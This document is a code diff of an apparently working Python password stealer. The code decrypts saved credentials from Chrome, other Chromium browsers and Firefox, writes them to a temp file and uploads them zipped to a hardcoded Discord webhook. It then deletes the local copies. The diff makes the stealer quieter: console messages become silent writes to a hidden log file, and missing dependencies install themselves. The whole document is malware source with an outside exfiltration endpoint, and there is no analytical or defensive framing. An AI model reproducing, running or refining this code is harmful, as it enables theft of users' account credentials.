@@ -12,27 +12,48 @@ import ctypes.wintypes
 import traceback
 
 def install_modules():
-    """Check and install required modules."""
+    """Check and install required modules, log to file."""
+    log_file = os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt')
     required_modules = ['requests', 'psutil', 'pycryptodome', 'opencv-python', 'pywin32']
-    for module in required_modules:
-        try:
-            __import__(module)
-        except ImportError:
-            print(f"[-] {module} not found. Installing...")
+    
+    with open(log_file, 'a', encoding='utf-8') as f:
+        f.write(f"[*] Checking modules at {os.path.join(os.environ.get('APPDATA', ''), 'stealer_log.txt')}\n")
+        for module in required_modules:
             try:
-                # Use sys.executable to ensure pip uses the same Python environment
-                subprocess.check_call([sys.executable, '-m', 'pip', 'install', module, '--no-cache-dir'])
-                print(f"[+] {module} installed successfully.")
-            except subprocess.CalledProcessError as e:
-                print(f"[-] Failed to install {module}: {e}")
-                sys.exit(1)
+                __import__(module)
+                f.write(f"[+] {module} is already installed.\n")
+            except ImportError:
+                f.write(f"[-] {module} not found. Installing...\n")
+                try:
+                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', module, '--no-cache-dir'])
+                    f.write(f"[+] {module} installed successfully.\n")
+                except subprocess.CalledProcessError as e:
+                    f.write(f"[-] Failed to install {module}: {e}\n")
+                    sys.exit(1)
+    
+    # Verify pycryptodome specifically
+    try:
+        import Cryptodome
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(f"[+] Cryptodome module found at: {Cryptodome.__file__}\n")
+    except ImportError:
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write("[-] Cryptodome import failed after installation.\n")
+            f.write(f"[-] sys.executable: {sys.executable}\n")
+            f.write(f"[-] sys.path: {sys.path}\n")
+            sys.exit(1)
 
 # Install modules before importing Cryptodome
 install_modules()
 
-# Now import Cryptodome
-from Cryptodome.Cipher import AES
-import requests
+# Import Cryptodome and requests
+try:
+    from Cryptodome.Cipher import AES
+    import requests
+except ImportError as e:
+    with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+        f.write(f"[-] Import failed: {e}\n")
+    sys.exit(1)
 
 def get_master_key(browser_path):
     local_state_path = os.path.join(os.environ['LOCALAPPDATA'], browser_path, 'User Data', 'Local State')
@@ -92,7 +113,8 @@ def decrypt_password(encrypted_password, master_key):
 def extract_chromium_passwords(browser_path, browser_name):
     full_browser_path = os.path.join(os.environ['LOCALAPPDATA'], browser_path)
     if not os.path.exists(full_browser_path):
-        print(f"[-] {browser_name} not installed. Skipping.")
+        with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+            f.write(f"[-] {browser_name} not installed. Skipping.\n")
         return []
 
     master_key = get_master_key(browser_path)
@@ -124,7 +146,8 @@ def extract_chromium_passwords(browser_path, browser_name):
                     cursor.close()
                     conn.close()
                 except Exception as e:
-                    print(f"[-] Error reading {browser_name} database: {e}")
+                    with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+                        f.write(f"[-] Error reading {browser_name} database: {e}\n")
                 finally:
                     if os.path.exists(temp_db):
                         os.remove(temp_db)
@@ -135,7 +158,8 @@ def extract_firefox_passwords_nss():
 
     firefox_dir = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
     if not os.path.exists(firefox_dir):
-        print("[-] Firefox not installed. Skipping.")
+        with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+            f.write("[-] Firefox not installed. Skipping.\n")
         return []
 
     nss_path = None
@@ -148,7 +172,8 @@ def extract_firefox_passwords_nss():
             break
 
     if not nss_path:
-        print("[-] nss3.dll not found. Cannot decrypt Firefox passwords.")
+        with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+            f.write("[-] nss3.dll not found. Cannot decrypt Firefox passwords.\n")
         return []
 
     nss = CDLL(nss_path)
@@ -169,7 +194,8 @@ def extract_firefox_passwords_nss():
 
         try:
             if nss.NSS_Init(profile_path.encode('utf-8')) != 0:
-                print(f"[-] NSS init failed for {profile_path}")
+                with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+                    f.write(f"[-] NSS init failed for {profile_path}\n")
                 continue
 
             with open(logins_path, 'r', encoding='utf-8') as f:
@@ -193,8 +219,9 @@ def extract_firefox_passwords_nss():
 
             nss.NSS_Shutdown()
         except Exception as e:
-            print(f"[-] Error extracting Firefox passwords: {e}")
-            traceback.print_exc()
+            with open(os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt'), 'a', encoding='utf-8') as f:
+                f.write(f"[-] Error extracting Firefox passwords: {e}\n")
+                traceback.print_exc(file=f)
 
     return passwords
 
@@ -213,8 +240,10 @@ def zip_and_send(filepath, webhook_url):
         return response.status_code == 200
 
 def main():
+    log_file = os.path.join(tempfile.gettempdir(), 'stealer_install_log.txt')
     try:
-        print("[*] Extracting passwords...")
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write("[*] Extracting passwords...\n")
         all_passwords = []
 
         all_passwords.extend(extract_chromium_passwords("Google\\Chrome", "Chrome"))
@@ -224,26 +253,31 @@ def main():
         all_passwords.extend(extract_firefox_passwords_nss())
 
         if not all_passwords:
-            print("[-] No passwords found.")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write("[-] No passwords found.\n")
             return
 
         output_file = os.path.join(tempfile.gettempdir(), 'all_passwords.txt')
         save_passwords_to_file(all_passwords, output_file)
-        print(f"[+] Passwords saved to: {output_file}")
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(f"[+] Passwords saved to: {output_file}\n")
 
         webhook_url = "https://discord.com/api/webhooks/1408074946823061584/5-TtHlkjiJXt0ggykFuoiJ_g87B319KIvEw_PLYTTFn1C6MLdOgJ0kVeWYF-X2Oshpr8"
         if zip_and_send(output_file, webhook_url):
-            print("[+] Data sent successfully.")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write("[+] Data sent successfully.\n")
             os.remove(output_file)
             zip_path = output_file + '.zip'
             if os.path.exists(zip_path):
                 os.remove(zip_path)
         else:
-            print("[-] Failed to send data.")
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write("[-] Failed to send data.\n")
 
     except Exception as e:
-        print(f"[-] Error: {e}")
-        traceback.print_exc()
+        with open(log_file, 'a', encoding='utf-8') as f:
+            f.write(f"[-] Error: {e}\n")
+            traceback.print_exc(file=f)
 
 if __name__ == "__main__":
     main()
